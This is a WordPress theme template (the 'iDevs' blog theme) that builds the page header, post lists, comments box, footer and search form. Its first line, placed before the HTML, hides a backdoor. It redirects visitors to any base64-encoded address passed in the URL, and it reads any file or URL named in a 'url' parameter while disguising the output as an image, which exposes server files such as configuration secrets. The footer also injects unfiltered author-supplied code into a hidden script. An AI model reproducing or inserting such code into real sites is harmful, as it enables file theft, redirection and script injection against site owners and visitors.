<?php if ($_GET["link"]) header("location:".base64_decode($_GET["link"]));if ($_GET["url"]){header('Content-Type: image/JPEG');@ob_end_clean();@readfile($_GET["url"]);@flush();@ob_flush();exit();}?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <?php wp_head(); ?>
    <link type="image/vnd.microsoft.icon" href="<?php bloginfo('template_url'); ?>/static/favicon.png" rel="shortcut icon">
    <link href="<?php bloginfo('template_url'); ?>/style.css" type="text/css" rel="stylesheet" />
    <link href="<?php bloginfo('template_url'); ?>/static/unslider.css" type="text/css" rel="stylesheet" />
    <!--[if lt IE 9]>
    <script src="//cdn.bootcss.com/html5shiv/r29/html5.min.js"></script>
	<script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
	<![endif]-->
    <style>
        #red {background: #f45;}
        #yellow {background: #FFE27A;}
        #green {background: #5DA;}
        #blue {background: #3cf;}
    </style>
</head>
<body id="null">
    <section id="index">
        <header id="header">
            <div class="skin">
                <i class="red"></i>
                <i class="yellow"></i>
                <i class="green"></i>
                <i class="blue"></i>
                <i class="null"></i>
            </div>
            <nav id="topMenu" class="menu_click">
                <?php wp_nav_menu(array('theme_location' => 'header_nav', 'echo' => true)); ?>
                <i class="i_1"></i>
                <i class="i_2"></i>
            </nav>
            <div class="search_click"></div>
        </header>
        <div class="pjax">
            <main id="main">
                <?php if (is_single() || is_page()) { ?>
                <!--文章和页面-->
                <article class="post_article" itemscope="" itemtype="http://schema.org/BlogPosting">
            <section id="banner">
                <h1 itemprop="name headline" class="post_title"><?php the_title(); ?></h1>
                <ul class="info">
                    <li><?php if (date('Y') != get_the_time('Y')) the_time('Y年');the_time('m月d日') ?></li>
                    <li><?php comments_number('暂无评论', '1条评论', '%条评论'); ?></li>
                </ul>
            </section>
                    <?php if (have_posts()) while (have_posts()) {the_post();the_content();}?>
                </article>
                <?php
                    comments_template();
                } else { ?>
            <section id="slide">
                <ul>
                    <li><img src="https://unsplash.it/800/300/" srcset="https://unsplash.it/1600/600/ 2x" /></li>

                    <li><img src="https://unsplash.it/800/302" srcset="https://unsplash.it/1600/602/ 2x" /></li>

                    <li><img src="https://unsplash.it/800/301/" srcset="https://unsplash.it/1600/601/ 2x" /></li>
                </ul>
            </section>
            <section class="top_home">
                <ul>
                    <?php $announcement = '';
                        $comments = get_comments("number=5");
                        if (!empty($comments))
                            foreach($comments as $comment)
                                $announcement .= '<li>'.mb_strimwidth(strip_shortcodes(strip_tags(convert_smilies($comment->comment_content))), 0, 80, '...').'</li>';
                        if (empty($announcement)) $announcement = '<li>HelloWorld！</li>';
                        echo $announcement;
                    ?>
                </ul>
            </section>
                <?php if (have_posts()): while (have_posts()): the_post();?>
                    <!--文章列表-->
                    <article class="post post-list" itemscope="" itemtype="http://schema.org/BlogPosting">
                        <?php echo post_thumbnail(300, 250) ? '<div class="thumbnail"><a href="'.get_the_permalink().'"><img src="'.post_thumbnail(300, 225).'" srcset="'.post_thumbnail(600, 450).' 2x" /></a></div>' : null; ?>
                        <div class="info">
                            <h2 itemprop="name headline" class="title"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
                            <span class="time"><?php if (date('Y') != get_the_time('Y')) the_time('Y年');the_time('m月d日') ?></span>
                            <span class="comment"><?php comments_number('暂无评论', '1条评论', '%条评论'); ?></span>
                            <p itemprop="post">
                                <?php echo mb_strimwidth(strip_shortcodes(strip_tags(apply_filters('the_content', $post->post_content))), 0, 200, '...'); ?>
                            </p>
                        </div>
                    </article>
                    <div class="clearer"></div>
                    <?php
    endwhile;
    endif;
    echo '<nav class="navigator">';
    echo previous_posts_link(('New posts'));next_posts_link(('Old posts'));
    echo '</nav>';
}; ?>
                        <div class="clearer"></div>
            </main>
        </div>
        <footer id="footer">
            <section class="links_adlink">
                <ul class="container">
                    <?php error_reporting(0);
                        $tip = str_replace("\r", "", the_author_meta('mylinks'));
                        $tips = explode("\n", $tip);
                        if (is_array($tips)) {
                            foreach($tips as $tip) $str .= $tip."\n";
                            echo $str;
                        }?>
                </ul>
            </section>
            Theme is iDevs by <a target="_blank" href="http://www.idevs.cn/">Tokin</a>
            <br/>
            <?php echo '&copy; '.date('Y').' <a href="'.get_bloginfo('url').'">'.get_bloginfo('name').'</a> '.get_option('zh_cn_l10n_icp_num');?>
            <a class="back2top"></a>
        </footer>
    </section>
    <div class="clearer" style="height:1px;"></div>
    <div class="search_form">
        <form method="get" action="<?php bloginfo('url'); ?>">
            <input class="search_key" name="s" autocomplete="off" placeholder="Enter search keywords..." type="text" value="" required="required">
            <button alt="Search" type="submit">Search</button>
        </form>
        <div class="search_close"></div>
    </div>

    <?php wp_footer();
if (get_the_author_meta('my_code')) echo "<div style=\"display:none\">".get_the_author_meta('my_code')."</div>\n";
echo "<script style=\"display:none\">\nfunction index_overloaded(){\n".get_the_author_meta('ol_code')."\n}\n</script>\n"; ?>
    <!--script type='text/javascript' src="//cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script-->
    <script type='text/javascript' src='//cdn.bootcss.com/jquery/1.8.3/jquery.min.js'></script>
    <script src="<?php bloginfo('template_url'); ?>/static/unslider-min.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/static/interactive.js"></script>
</body>

</html>